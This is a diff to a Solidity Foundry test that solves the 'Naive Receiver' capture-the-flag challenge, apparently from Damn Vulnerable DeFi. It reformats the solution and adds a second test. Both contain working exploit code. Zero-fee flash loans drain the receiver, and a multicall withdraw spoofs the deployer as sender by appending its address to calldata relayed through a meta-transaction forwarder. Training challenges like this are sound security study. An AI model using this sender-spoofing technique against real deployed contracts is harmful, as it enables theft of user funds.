@@ -82,16 +82,63 @@ contract NaiveReceiverChallenge is Test {
             callDatas[i] = abi.encodeCall(NaiveReceiverPool.flashLoan, (receiver, address(weth), 0, ""));
         }
 
-        callDatas[10] = abi.encodePacked(abi.encodeCall(NaiveReceiverPool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))), bytes32(uint256(uint160(deployer))));
+        callDatas[10] = abi.encodePacked(
+            abi.encodeCall(NaiveReceiverPool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))),
+            bytes32(uint256(uint160(deployer)))
+        );
         bytes memory callData;
         callData = abi.encodeCall(pool.multicall, callDatas);
 
-        BasicForwarder.Request memory request = BasicForwarder.Request(player, address(pool), 0, gasleft(), forwarder.nonces(player), callData, 1 days);
-        bytes32 requestHash = keccak256(abi.encodePacked("\x19\x01", forwarder.domainSeparator(), forwarder.getDataHash(request)));
+        BasicForwarder.Request memory request =
+            BasicForwarder.Request(player, address(pool), 0, gasleft(), forwarder.nonces(player), callData, 1 days);
+        bytes32 requestHash =
+            keccak256(abi.encodePacked("\x19\x01", forwarder.domainSeparator(), forwarder.getDataHash(request)));
         (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, requestHash);
         bytes memory signature = abi.encodePacked(r, s, v);
 
         forwarder.execute(request, signature);
+    }
+
+    function testAbi() public {
+        vm.startPrank(player);
+
+        // First, let's check if the deployer has any deposits
+        uint256 deployerDeposits = pool.deposits(deployer);
+        console.log("Deployer deposits:", deployerDeposits);
+
+        // Let's try a different approach - use multicall like in the working example
+        bytes[] memory callDatas = new bytes[](1);
+
+        // Create a withdraw call with a small amount
+        callDatas[0] = abi.encodePacked(
+            abi.encodeCall(NaiveReceiverPool.withdraw, (pool.deposits(deployer), payable(recovery))),
+            bytes32(uint256(uint160(deployer)))
+        );
+
+        // Use multicall to execute the withdraw
+        bytes memory callData = abi.encodeCall(pool.multicall, (callDatas));
+
+        /* emit log_named_bytes("calldata", callData);
+        emit log_named_bytes("callDatas", callDatas[0]); */
+        BasicForwarder.Request memory request =
+            BasicForwarder.Request(player, address(pool), 0, gasleft(), forwarder.nonces(player), callData, 1 days);
+
+        bytes32 requestHash =
+            keccak256(abi.encodePacked("\x19\x01", forwarder.domainSeparator(), forwarder.getDataHash(request)));
+
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, requestHash);
+        bytes memory signature = abi.encodePacked(r, s, v);
+
+        bytes memory executeCallData = abi.encodeWithSelector(
+        forwarder.execute.selector,
+        request,
+        signature
+        );
+        emit log_named_bytes("execute call data", executeCallData);
+        forwarder.execute(request, signature);
+        vm.stopPrank();
+
+        assertEq(weth.balanceOf(recovery), 1000 ether, "Not enough WETH in recovery account");
     }
 
     /**
